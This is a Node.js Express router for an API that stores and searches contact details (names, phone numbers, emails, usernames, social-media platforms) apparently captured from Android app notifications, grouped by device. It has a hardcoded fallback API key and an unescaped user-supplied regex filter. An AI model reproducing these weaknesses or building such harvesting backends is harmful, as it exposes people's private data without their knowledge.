const express = require('express');
const ContactInfo = require('../models/ContactInfo');
const deviceService = require('../services/deviceService');
const router = express.Router();

// Middleware to verify API key
const verifyApiKey = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const validApiKey = process.env.API_KEY || 'android-notification-capture-2024-secure-key-v2';
    
    if (!apiKey || apiKey !== validApiKey) {
        return res.status(401).json({
            success: false,
            message: 'Invalid or missing API key'
        });
    }
    next();
};

const escapeRegExp = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

const buildSearchConditions = (search) => {
    if (!search || typeof search !== 'string') return [];
    const tokens = search.split(/\s+/).filter(Boolean);
    if (tokens.length === 0) return [];

    const fields = [
        'contactName',
        'packageName',
        'appName',
        'deviceId',
        'phoneNumbers',
        'emailAddresses',
        'usernames',
        'sourceText',
        'socialMediaPlatform'
    ];

    const conditions = [];
    tokens.forEach((token) => {
        const regex = new RegExp(escapeRegExp(token), 'i');
        fields.forEach((field) => {
            conditions.push({ [field]: regex });
        });
    });

    return conditions;
};

// Apply API key verification to all routes
router.use(verifyApiKey);

// POST /api/contacts - Save contact information
router.post('/', async (req, res) => {
    try {
        const contactData = req.body;
        
        // Validate required fields
        if (!contactData.deviceId || !contactData.packageName || !contactData.appName || !contactData.contactType) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: deviceId, packageName, appName, contactType'
            });
        }

        // Ensure contactName is provided for unique constraint
        if (!contactData.contactName) {
            contactData.contactName = contactData.contactType || 'Unknown Contact';
        }

        const query = {
            deviceId: contactData.deviceId,
            contactName: contactData.contactName
        };

        const existingContact = await ContactInfo.findOne(query).lean();

        // Use upsert to prevent duplicates based on deviceId + contactName
        const contactInfo = await ContactInfo.findOneAndUpdate(
            query,
            contactData,
            { 
                upsert: true, 
                new: true,
                setDefaultsOnInsert: true
            }
        );

        console.log(`✅ Contact info saved/updated: ${contactData.contactName} from ${contactData.appName}`);

        if (!existingContact) {
            deviceService.incrementDeviceStats(
                contactData.deviceId,
                { totalContacts: 1 }
            ).catch((error) => {
                console.error('❌ Failed to increment device contact count:', error.message);
            });
        }

        res.status(201).json({
            success: true,
            message: 'Contact information saved successfully',
            data: {
                id: contactInfo._id,
                contactName: contactInfo.contactName,
                contactType: contactInfo.contactType,
                appName: contactInfo.appName,
                timestamp: contactInfo.timestamp
            }
        });

    } catch (error) {
        console.error('❌ Error saving contact info:', error);
        
        // Handle duplicate key error specifically
        if (error.code === 11000) {
            return res.status(409).json({
                success: false,
                message: 'Contact already exists for this device',
                error: 'Duplicate contact detected'
            });
        }
        
        res.status(500).json({
            success: false,
            message: 'Failed to save contact information',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/contacts - Fetch contact information
router.get('/', async (req, res) => {
    try {
        const {
            deviceId,
            packageName,
            contactType,
            contactName,
            search,
            page = 1,
            limit = 50,
            sortBy = 'timestamp',
            sortOrder = 'desc'
        } = req.query;

        const query = {};
        if (deviceId) query.deviceId = deviceId;
        if (packageName) query.packageName = packageName;
        if (contactType) query.contactType = contactType;
        if (contactName) query.contactName = new RegExp(contactName, 'i');

        const searchConditions = buildSearchConditions(search);
        if (searchConditions.length > 0) {
            query.$or = searchConditions;
        }

        const sort = {};
        sort[sortBy] = sortOrder === 'desc' ? -1 : 1;

        const pageNumber = parseInt(page, 10) || 1;
        const limitNumber = parseInt(limit, 10) || 50;
        const skip = (pageNumber - 1) * limitNumber;

        const [contacts, total] = await Promise.all([
            ContactInfo.find(query)
                .sort(sort)
                .skip(skip)
                .limit(limitNumber)
                .lean(),
            ContactInfo.countDocuments(query)
        ]);
        const totalPages = Math.ceil(total / limitNumber);

        res.json({
            success: true,
            data: {
                contacts,
                pagination: {
                    page: pageNumber,
                    limit: limitNumber,
                    total,
                    pages: totalPages
                }
            }
        });

    } catch (error) {
        console.error('❌ Error fetching contacts:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch contact information',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/contacts/stats - Get contact statistics
router.get('/stats', async (req, res) => {
    try {
        const { deviceId, packageName } = req.query;

        const matchQuery = {};
        if (deviceId) matchQuery.deviceId = deviceId;
        if (packageName) matchQuery.packageName = packageName;

        const stats = await ContactInfo.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalContacts: { $sum: 1 },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueContactTypes: { $addToSet: '$contactType' },
                    socialMediaContacts: {
                        $sum: { $cond: [{ $eq: ['$isFromSocialMedia', true] }, 1, 0] }
                    },
                    verifiedContacts: {
                        $sum: { $cond: [{ $eq: ['$isVerified', true] }, 1, 0] }
                    },
                    avgConfidence: { $avg: '$confidence' },
                    avgMessageCount: { $avg: '$messageCount' }
                }
            },
            {
                $project: {
                    _id: 0,
                    totalContacts: 1,
                    uniqueApps: { $size: '$uniqueApps' },
                    uniqueContactTypes: { $size: '$uniqueContactTypes' },
                    socialMediaContacts: 1,
                    verifiedContacts: 1,
                    avgConfidence: { $round: ['$avgConfidence', 2] },
                    avgMessageCount: { $round: ['$avgMessageCount', 2] }
                }
            }
        ]);

        const result = stats.length > 0 ? stats[0] : {
            totalContacts: 0,
            uniqueApps: 0,
            uniqueContactTypes: 0,
            socialMediaContacts: 0,
            verifiedContacts: 0,
            avgConfidence: 0,
            avgMessageCount: 0
        };

        res.json({
            success: true,
            data: result
        });

    } catch (error) {
        console.error('❌ Error fetching contact stats:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch contact statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/contacts/by-app/:packageName - Get contacts by specific app
router.get('/by-app/:packageName', async (req, res) => {
    try {
        const { packageName } = req.params;
        const { deviceId, limit = 100 } = req.query;

        const query = { packageName };
        if (deviceId) query.deviceId = deviceId;

        const contacts = await ContactInfo.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .lean();

        res.json({
            success: true,
            data: {
                contacts,
                count: contacts.length,
                packageName
            }
        });

    } catch (error) {
        console.error('❌ Error fetching contacts by app:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch contacts by app',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/contacts/social-media - Get social media contacts only
router.get('/social-media', async (req, res) => {
    try {
        const { deviceId, platform, limit = 100 } = req.query;

        const query = { isFromSocialMedia: true };
        if (deviceId) query.deviceId = deviceId;
        if (platform) query.socialMediaPlatform = platform;

        const contacts = await ContactInfo.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .lean();

        res.json({
            success: true,
            data: {
                contacts,
                count: contacts.length,
                platform: platform || 'all'
            }
        });

    } catch (error) {
        console.error('❌ Error fetching social media contacts:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch social media contacts',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/contacts/metadata - Distinct filter values
router.get('/metadata', async (_req, res) => {
    try {
        const [devices, packages, contactTypes] = await Promise.all([
            ContactInfo.distinct('deviceId'),
            ContactInfo.distinct('packageName'),
            ContactInfo.distinct('contactType')
        ]);

        res.json({
            success: true,
            data: {
                devices: devices.filter(Boolean).sort(),
                packages: packages.filter(Boolean).sort(),
                contactTypes: contactTypes.filter(Boolean).sort()
            }
        });
    } catch (error) {
        console.error('❌ Error fetching contact metadata:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch contact metadata',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

module.exports = router;
